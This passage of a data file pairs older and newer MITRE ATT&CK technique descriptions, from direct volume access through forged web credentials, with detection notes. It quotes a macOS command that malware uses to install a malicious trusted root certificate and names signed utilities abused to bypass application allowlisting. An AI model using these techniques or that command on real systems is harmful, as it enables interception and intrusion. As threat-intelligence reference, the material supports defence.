Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy)."
A128,T1006,13.0,14.0,Direct Volume Access,Direct Volume Access,"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)

Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)","Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)

Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)"
A129,T1534,14.0,15.0,Internal Spearphishing,Internal Spearphishing,"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)

Adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.

There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the campaign and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)","After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation: Trend Micro - Int SP)

For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces.

Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps)"
A130,T1071,15.0,16.0,Application Layer Protocol,Application Layer Protocol,"Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22) ","Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22) "
A131,T1021,6.0,7.0,Remote Services,Remote Services,"An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.","Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.

In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)"
A132,T1114,5.0,6.0,Email Collection,Email Collection,"Adversaries may target user email to collect sensitive information from a target.

Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.

Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.

Some adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.","Adversaries may target user email to collect sensitive information from a target.

Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.

Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific key words.(Citation: Black Hills MailSniper, 2017)

### Email Forwarding Rule

Adversaries may also abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: TIMMCMIC, 2014)

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. "
A133,T1105,2.0,3.0,Remote File Copy,Remote File Copy,"Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with Windows Admin Shares or Remote Desktop Protocol.

Detection: Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Packet capture, Process use of network, Netflow/Enclave netflow, Network protocol analysis, Process monitoring

Permissions Required: User

Requires Network: Yes","Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076)."
A134,T1200,10.0,11.0,Hardware Additions,Hardware Additions,"Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), addition of new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.","Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.

While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)"
A135,T1557,10.0,11.0,Adversary-in-the-Middle,Adversary-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)

Adversaries may leverage the AiTM position to attempt to modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.","Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)

For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)

Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498)."
A136,T1608.004,10.0,11.0,Drive-by Target,Drive-by Target,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).

Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including inserting malicious script into web pages or other user controllable web content such as forum posts. Adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers. In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)

Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack.

Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).","Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).

Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including inserting malicious script into web pages or other user controllable web content such as forum posts. Adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers. In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)

Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.

Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)."
A137,T1130,2.0,3.0,Install Root Certificate,Install Root Certificate,"Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)

Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)

Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)

In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)

Detection: A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl. (Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List. (Citation: Microsoft Sigcheck May 2017)

Installed root certificates are located in the Registry under <code>HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\</code> and <code>[HKLM or HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison: (Citation: Tripwire AppUNBlocker)
*18F7C1FCC3090203FD5BAA2F861A754976C8DD25
*245C97DF7514E7CF2DF8BE72AE957B9E04741E85
*3B1EFD3A66EA28B16697394703A72CA340A05BD5
*7F88CD7223F3C813818C994614A89C99FA3B5247
*8F43288AD272F3103B6FB1428485EA3014C0BCFE
*A43489159A520F0D93D032CCAF37E7FE20A8B419
*BE36A4562FB2EE05DBB3D32323ADF445084ED656
*CDD4EEAE6000AC7F40C3802C171E30148030C072

Platforms: Linux, Windows, macOS

Data Sources: SSL/TLS inspection, Digital Certificate Logs

Defense Bypassed: Digital Certificate Validation

Permissions Required: Administrator, User

Contributors: Itzik Kotler, SafeBreach, Travis Smith, Tripwire, Red Canary, Matt Graeber, @mattifestation, SpecterOps","Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)

Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)

Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)

In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)"
A138,T1108,5.0,6.0,Redundant Access,Redundant Access,"Adversaries may use more than one remote access tool with varying command and control protocols as a hedge against detection. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network. (Citation: Mandiant APT1)

Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.","Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. 

If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.

Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server."
A139,T1116,2.0,3.0,Code Signing,Code Signing,"Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)

Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system.

Detection: Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.

Platforms: Windows, macOS

Data Sources: Binary file metadata

Defense Bypassed: Windows User Account Control","Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)

Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system."
A140,T1009,2.0,3.0,Binary Padding,Binary Padding,"Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.

Detection: Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool. 

When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file.

Platforms: Linux, macOS, Windows

Defense Bypassed: Anti-virus, Signature-based detection",Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.
A141,T1041,6.0,7.0,Exfiltration Over Command and Control Channel,Exfiltration Over C2 Channel,Data exfiltration is performed over the Command and Control channel. Data is encoded into the normal communications channel using the same protocol as command and control communications.,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.
A142,T1127,2.0,3.0,Trusted Developer Utilities,Trusted Developer Utilities,"There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.

===MSBuild===

MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. (Citation: MSDN MSBuild) 

Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. (Citation: MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

===DNX===

The .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: Microsoft Migrating from DNX) DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. 

An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)

===RCSI===

The rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)

C# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe. (Citation: engima0x3 RCSI Bypass)

===WinDbg/CDB===

WinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools. (Citation: Microsoft Debugging Tools for Windows) They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.

An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities. (Citation: Exploit Monday WinDbg)

It is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.

===Tracker===

The file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system. (Citation: Microsoft Docs File Tracking)

An adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. (Citation: Twitter SubTee Tracker.exe)

Detection: The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

Use process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, cdb.exe, and tracker.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.

Platforms: Windows

Data Sources: Process monitoring

Defense Bypassed: Application whitelisting

Permissions Required: User

System Requirements: MSBuild: .NET Framework version 4 or higher
DNX: .NET 4.5.2, Powershell 4.0
RCSI: .NET 4.5 or later, Visual Studio 2012

Remote Support: No

Contributors: Casey Smith, Matthew Demaske, Adaptforward","There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.

### MSBuild

MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. (Citation: MSDN MSBuild) 

Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. (Citation: MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)

### DNX

The .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: Microsoft Migrating from DNX) DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. 

An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)

### RCSI

The rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)

C# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe. (Citation: engima0x3 RCSI Bypass)

### WinDbg/CDB

WinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools. (Citation: Microsoft Debugging Tools for Windows) They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.

An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities. (Citation: Exploit Monday WinDbg)

It is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.

### Tracker

The file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system. (Citation: Microsoft Docs File Tracking)

An adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. (Citation: Twitter SubTee Tracker.exe)"
A143,T1606,12.0,13.0,Forge Web Credentials,Forge Web Credentials,"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.

Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator)

Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)","Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.

